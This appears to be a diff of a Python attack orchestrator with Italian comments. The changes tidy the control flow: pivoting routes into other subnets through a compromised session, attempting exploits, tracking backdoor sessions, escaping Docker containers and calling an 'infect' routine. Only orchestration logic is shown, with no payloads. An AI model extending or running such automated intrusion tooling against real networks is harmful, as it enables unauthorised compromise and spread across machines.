@@ -65,12 +65,10 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
 
 
         if(target_ip in other_subnet):
-
             if(atk_sess==None):
                 print(f"{C.COL_RED}[-] subnet not reachable, no intermediate session available{C.COL_RESET}") 
                 return 
-
-            if(atk_sess!=None):
+            else:
                 print(f"{C.COL_YELLOW}[*] other subnet found, adding new routes{C.COL_RESET}")
                 mc.route_add(met_sess["id_sess"], target_ip)
                 #mc.route_print()
@@ -134,22 +132,15 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
             
             session=mc.attempt_attack(attack_obj)
             #print(attack_obj.output)
-
             #print(session)
+            
             if(session):
                 
                 #poiché potrebbero avvenire dei falsi positivi di qualche attacco passato dobbiamo controllare che la sessione
                 #trvata sia quella della macchina bersaglio attuale, e non di una vecchia
                 if (session[0:1][0] == target_ip):
-                #se abbiamo una connessione con la backdoor
-                    #print(session)
-                #if("backdoor_sess" in session[1:2][0]):
-                    #sessione della backdoor, potrebbe servire in futuro nel caso in cui si vogliano effettuare operazioni tramite la backdoor
-                    #network_passing_session = session[1:2][0]["backdoor_sess"]
-                    #id della sessione del client degli attacchi, servirà per i successivi attacchi OOB
-                    #print(session[1:2][0]["id_sess"])
+                
                     atk_sess=session[1:2][0]["id_sess"]
-                    #print(atk_sess)
                     #TODO: Non essendo stato testato questo tipo di attacco tramite una sessione controllare che la funzione di attacco vada a buon fine
                     #togliendo il commento nella riga sottostante
                     #OOBSession = atk_sess
@@ -174,10 +165,12 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
                             mc.infect()
                         else:
                             print(f"{C.COL_RED}docker_escape failed! Aborting...  {C.COL_RESET}")
-                            break   
+                            break  
+                    else:
+                        break 
                 else:
                     print(f"{C.COL_YELLOW}[*] false positive occured, ignoring... {C.COL_RESET}")
-                    break
+                    
             else:
                 uncompromised_machines.add(target_ip)
                 print(f"{C.COL_RED}[-] xx Exploit failed {C.COL_RESET}")
